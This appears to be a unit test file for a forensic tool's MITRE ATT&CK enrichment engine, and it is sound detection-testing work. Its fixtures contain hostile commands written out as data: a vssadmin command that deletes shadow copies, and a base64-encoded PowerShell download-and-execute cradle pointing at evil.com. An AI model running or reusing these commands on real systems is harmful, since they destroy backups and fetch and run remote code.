"""Unit tests for MITRE ATT&CK Enrichment Engine."""

from datetime import datetime, timezone
from anubistrace.core.event import ForensicEvent, Severity, SourceType
from anubistrace.core.mitre import MitreEngine


def test_mitre_event_id_enrichment():
    # Test Security Log Cleared (Event 1102) -> Defense Evasion T1070.001
    event = ForensicEvent(
        timestamp=datetime.now(timezone.utc),
        source_type=SourceType.EVTX_SECURITY,
        action="Audit log cleared",
        event_id="1102",
        actor="Administrator",
    )

    enriched = MitreEngine.enrich(event)
    assert enriched.severity == Severity.CRITICAL
    assert "Defense Evasion" in enriched.mitre_tactics
    assert any("T1070.001" in t for t in enriched.mitre_techniques)


def test_mitre_lolbin_and_command_pattern():
    # Test vssadmin shadow copy deletion (Ransomware Heuristic)
    event = ForensicEvent(
        timestamp=datetime.now(timezone.utc),
        source_type=SourceType.EVTX_PROCESS,
        action="Process Spawned",
        event_id="4688",
        actor="evil_user",
        target="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin.exe delete shadows /all /quiet",
    )

    enriched = MitreEngine.enrich(event)
    assert enriched.severity == Severity.CRITICAL
    assert any("LOLBIN:VSSADMIN.EXE" in ioc for ioc in enriched.iocs)
    assert any("T1490" in tech for tech in enriched.mitre_techniques)


def test_encoded_powershell_detection():
    event = ForensicEvent(
        timestamp=datetime.now(timezone.utc),
        source_type=SourceType.EVTX_PROCESS,
        action="Process Spawned",
        event_id="4688",
        actor="compromised_svc",
        target="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAnACkA",
    )

    enriched = MitreEngine.enrich(event)
    assert enriched.severity >= Severity.HIGH
    assert any("T1027" in tech for tech in enriched.mitre_techniques)
